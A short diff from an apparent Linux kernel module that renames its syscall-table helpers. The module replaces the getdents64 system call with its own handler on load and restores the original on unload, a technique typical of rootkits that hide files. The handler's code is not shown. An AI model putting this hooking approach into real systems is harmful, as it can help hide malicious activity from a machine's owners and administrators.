@@ -64,7 +64,7 @@ int load(void) {
         return -EINVAL;
     }
 
-    unsigned long getdents_address = hijack_syscall(__NR_getdents64, (unsigned long)new_getdents64);
+    unsigned long getdents_address = set_syscall(__NR_getdents64, (unsigned long)new_getdents64);
     if (!getdents_address) {
         return -ENXIO;
     }
@@ -77,7 +77,7 @@ int load(void) {
  
 void unload(void) {
     pr_info("Shutting down.");
-    restore_syscall(__NR_getdents64, (unsigned long)original_getdents64_ptr);
+    set_syscall(__NR_getdents64, (unsigned long)original_getdents64_ptr);
     pr_info("Goodbye world...");
 }
 
